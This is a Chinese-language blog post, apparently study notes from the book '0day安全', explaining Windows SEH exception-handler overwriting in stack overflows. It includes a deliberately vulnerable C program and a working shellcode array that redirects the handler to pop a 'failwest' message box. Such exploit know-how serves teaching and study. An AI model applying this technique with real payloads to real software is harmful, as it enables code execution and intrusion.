@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="chinese">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="0day安全,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="近些年来的一些新型漏洞利用思路和攻击技巧">
+<meta name="keywords" content="0day安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内存攻击技术">
+<meta property="og:url" content="http://yoursite.com/2019/08/06/内存攻击技术/index.html">
+<meta property="og:site_name" content="loser的博客">
+<meta property="og:description" content="近些年来的一些新型漏洞利用思路和攻击技巧">
+<meta property="og:locale" content="chinese">
+<meta property="og:image" content="http://yoursite.com/2019/08/06/内存攻击技术/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/06/内存攻击技术/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/06/内存攻击技术/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/06/内存攻击技术/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/06/内存攻击技术/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/08/06/内存攻击技术/6.png">
+<meta property="og:updated_time" content="2019-08-06T13:17:05.968Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内存攻击技术">
+<meta name="twitter:description" content="近些年来的一些新型漏洞利用思路和攻击技巧">
+<meta name="twitter:image" content="http://yoursite.com/2019/08/06/内存攻击技术/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/08/06/内存攻击技术/">
+
+
+
+
+
+  <title>内存攻击技术 | loser的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="chinese">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">loser的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/内存攻击技术/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="loser">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="loser的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内存攻击技术</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-06T16:05:28+08:00">
+                2019-08-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>近些年来的一些新型漏洞利用思路和攻击技巧<br><a id="more"></a></p>
+<h1 id="狙击Windows-异常处理机制"><a href="#狙击Windows-异常处理机制" class="headerlink" title="狙击Windows 异常处理机制"></a>狙击Windows 异常处理机制</h1><h2 id="S-E-H-概述"><a href="#S-E-H-概述" class="headerlink" title="S.E.H 概述"></a>S.E.H 概述</h2><p>S.E.H 即异常处理结构体（Structure Exception Handler）,它是Windows 异常处理机制所采用的重要数据结构。每个S.E.H 包含两个DWORD 指针：S.E.H 链表指针和异常处理函数句柄，共8 个字节，如图所示</p>
+<p><img src="1.png" alt=""><br>初步了解:<br>（1）S.E.H 结构体存放在系统栈中。</p>
+<p>（2）当线程初始化时，会自动向栈中安装一个S.E.H，作为线程默认的异常处理。</p>
+<p>（3）如果程序源代码中使用了<strong>try{}</strong>except{}或者Assert 宏等异常处理机制，编译器将最终通过向当前函数栈帧中安装一个S.E.H 来实现异常处理。</p>
+<p>（4）栈中一般会同时存在多个S.E.H。</p>
+<p>（5）栈中的多个S.E.H 通过链表指针在栈内由栈顶向栈底串成单向链表，位于链表最顶端的S.E.H 通过T.E.B（线程环境块）0 字节偏移处的指针标识。</p>
+<p>（6）当异常发生时，操作系统会中断程序，并首先从T.E.B 的0 字节偏移处取出距离栈顶最近的S.E.H，使用异常处理函数句柄所指向的代码来处理异常。</p>
+<p>（7）当离“事故现场”最近的异常处理函数运行失败时，将顺着S.E.H 链表依次尝试其他的异常处理函数。</p>
+<p>（8）如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数。通常，这个函数会弹出一个错误对话框，然后强制关闭程序。</p>
+<p>S.E.H链表：<br><img src="2.png" alt=""><br>S.E.H 就是在系统关闭程序之前，给程序一个执行预先设定的回调函数（call back）的机会<br>（1）S.E.H 存放在栈内，故溢出缓冲区的数据有可能淹没S.E.H。<br>（2）精心制造的溢出数据可以把S.E.H 中异常处理函数的入口地址更改为shellcode 的起始地址。<br>（3）溢出后错误的栈帧或堆块数据往往会触发异常。<br>（4）当Windows 开始处理溢出后的异常时，会错误地把shellcode 当作异常处理函数而执行。</p>
+<h2 id="在栈溢出中利用S-E-H"><a href="#在栈溢出中利用S-E-H" class="headerlink" title="在栈溢出中利用S.E.H"></a>在栈溢出中利用S.E.H</h2><p>代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char shellcode[] = &quot;\x90\x90\x90\x90……&quot;;</span><br><span class="line">DWORD MyExceptionhandler(void)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;got an exception, press Enter to kill process!\n&quot;);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(1);</span><br><span class="line">&#125;</span><br><span class="line">void test(char * input)</span><br><span class="line">&#123;</span><br><span class="line">char buf[200];</span><br><span class="line">int zero=0;</span><br><span class="line">__asm int 3 //used to break process for debug</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line">strcpy(buf,input); //overrun the stack</span><br><span class="line">zero=4/zero; //generate an exception</span><br><span class="line">&#125;</span><br><span class="line">__except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>简单解释：<br>（1）函数test 中存在典型的栈溢出漏洞。<br>（2）<strong>try{}会在test 的函数栈帧中安装一个S.E.H 结构。<br>（3）</strong>try 中的除零操作会产生一个异常。<br>（4）当strcpy 操作没有产生溢出时，除零操作的异常将最终被MyExceptionhandler 函数处理。</p>
+<p>（5）当strcpy 操作产生溢出，并精确地将栈帧中的S.E.H 异常处理句柄修改为shellcode 的入口地址时，操作系统将会错误地使用shellcode 去处理除零异常，也就是说，代码植入成功。</p>
+<p>（6）此外，异常处理机制与堆分配机制类似，会检测进程是否处于调试状态。如果直接使用调试器加载程序，异常处理会进入调试状态下的处理流程。因此，我们这里同样采用直接在代码中加入断点_asm int 3，让进程自动中断后再用调试器attach 的方法进行调试。</p>
+<p>这个实验用来确定栈帧中的S.E.H回调句柄的偏移精确地淹没这个位置，将该句柄修改为shellcode 的起始位置。</p>
+<p>数组中的0x90 能够帮我们在调试器中轻易地确定shellcode 的起始位置0x0012FE98。</p>
+<p><img src="3.png" alt=""><br>OllyDbg 当前线程一共安装了3 个S.E.H，离栈顶最近的位于0x0012FF68，如果在当前函数内发生异常，首先使用的将是这个S.E.H。我们回到栈中看看这个S.E.H 的状况，OllyDbg已经自动为它加上了注释，如图所示</p>
+<p>这个S.E.H 就在离EBP 与函数返回地址不远的地方，0x0012FF68 为指向下一个S.E.H 的链表指针，0x0012FF6C 处的指针0x00401214 则是我们需要修改的异常回调函数句柄。</p>
+<p><img src="4.png" alt=""><br><img src="5.png" alt=""><br>剩下的工作就是组织缓冲区，把0x0012FF6C 处的回调句柄修改成shellcode 的起始地址0x0012FE98。</p>
+<p>缓冲区起始地址0x0012FE98 与异常句柄0x0012FF6C 之间共有212 个字节的间隙，也就是说，超出缓冲区12 个字节后的部分将覆盖S.E.H。</p>
+<p>仍然使用弹出“failwest”消息框的shellcode 进行测试，将不足212 字节的部分用0x90 字节补齐；213~216 字节使用0x0012FE98 填充，用于更改异常回调函数的句柄；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">char shellcode[]=</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span><br><span class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span><br><span class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span><br><span class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span><br><span class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span><br><span class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span><br><span class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span><br><span class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span><br><span class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span><br><span class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span><br><span class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">&quot;\x90\x90\x90\x90\x98\xFE\x12\x00&quot;;</span><br><span class="line">DWORD MyExceptionhandler(void)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;got an exception, press Enter to kill process!\n&quot;);</span><br><span class="line">getchar();</span><br><span class="line">ExitProcess(1);</span><br><span class="line">&#125;</span><br><span class="line">void test(char * input)</span><br><span class="line">&#123;</span><br><span class="line">char buf[200];</span><br><span class="line">int zero=0;</span><br><span class="line">_try</span><br><span class="line">&#123;</span><br><span class="line">strcpy(buf,input); //overrun the stack</span><br><span class="line">zero=4/zero; //generate an exception</span><br><span class="line">&#125;</span><br><span class="line">_except(MyExceptionhandler())&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">test(shellcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编译运行后：<br><img src="6.png" alt=""><br>这时操作系统将错误地使用shellcode 去处理除零异常，从而使植入的代码获得执行。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/0day安全/" rel="tag"># 0day安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/02/堆溢出利用/" rel="next" title="堆溢出利用">
+                <i class="fa fa-chevron-left"></i> 堆溢出利用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2049/11/30/C-学习笔记/" rel="prev" title="C++学习笔记">
+                C++学习笔记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">loser</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#狙击Windows-异常处理机制"><span class="nav-number">1.</span> <span class="nav-text">狙击Windows 异常处理机制</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#S-E-H-概述"><span class="nav-number">1.1.</span> <span class="nav-text">S.E.H 概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#在栈溢出中利用S-E-H"><span class="nav-number">1.2.</span> <span class="nav-text">在栈溢出中利用S.E.H</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">loser</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
